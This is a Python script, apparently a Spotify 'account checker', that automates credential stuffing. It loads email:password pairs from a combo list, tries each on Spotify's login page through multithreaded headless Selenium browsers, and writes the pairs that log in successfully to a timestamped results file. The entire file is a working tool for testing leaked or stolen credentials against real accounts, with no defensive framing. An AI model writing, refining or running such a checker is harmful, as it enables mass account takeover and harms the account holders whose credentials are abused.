import threading, time, datetime, os

from selenium import webdriver
from selenium.webdriver.common.by import By

from colorama import Fore, Back
import colorama

# <==== Configs ====>

MAX_THREADS = 5
CURRENT_THREADS = 0

COMBO_PATH = 'accounts.txt'

RESULTS_FILE_NAME = f'results/results-{datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.txt'

colorama.init(autoreset=True)

options = webdriver.ChromeOptions()

options.add_argument("--headless")
options.add_argument("--disable-gpu")
options.add_argument("--incognito")
options.add_argument('--disable-extensions')
options.add_experimental_option('excludeSwitches', ['enable-logging'])

url = 'https://accounts.spotify.com/pt-BR/login'  # 'pt-BR' = brazilian link ⚽

# <==== Configs ====>

if not os.path.exists('results'):
    os.mkdir('results')

with open(COMBO_PATH, 'r') as file:
    accounts = file.read().split('\n')
    for i in accounts:
        if i == "":
            accounts.remove(i)


def check_account(account):
    global CURRENT_THREADS
    
    CURRENT_THREADS += 1
    
    driver = webdriver.Chrome(options=options)
    driver.get(url)
    driver.implicitly_wait(30)

    email, password = account.split(':')

    # login process
    driver.find_element(By.CSS_SELECTOR, '#login-username').send_keys(email)
    driver.find_element(By.CSS_SELECTOR, '#login-password').send_keys(password)
    driver.find_element(By.CSS_SELECTOR, '#login-button').click()
    # login process

    time.sleep(1.7)

    # valid
    if driver.current_url == "https://accounts.spotify.com/pt-BR/status":
        print(f"{Fore.BLACK}{Back.GREEN}[VALID]{Back.RESET}{Fore.RESET} {email}:{password}")

        with open(RESULTS_FILE_NAME, 'a') as file:
            file.write(f"{email}:{password}\n")
        
        CURRENT_THREADS -= 1
        
        driver.close()
        return
    
    # invalid
    print(f"{Fore.BLACK}{Back.RED}[INVALID]{Back.RESET}{Fore.RESET} {email}:{password}")

    time.sleep(0.5)
    CURRENT_THREADS -= 1
    driver.close()


print(f"Running {MAX_THREADS} threads...\n")

for acc in accounts:
    while True:
        if CURRENT_THREADS == 5:
            time.sleep(0.5)
            continue
        break
        
    threading.Thread(target=check_account, args=(acc,)).start()
    time.sleep(0.5)

while True:
    if CURRENT_THREADS == 0:
        print(f'\nYour accounts were saved in "{RESULTS_FILE_NAME}"\n')
        break
    time.sleep(1)

input("Press enter to exit")
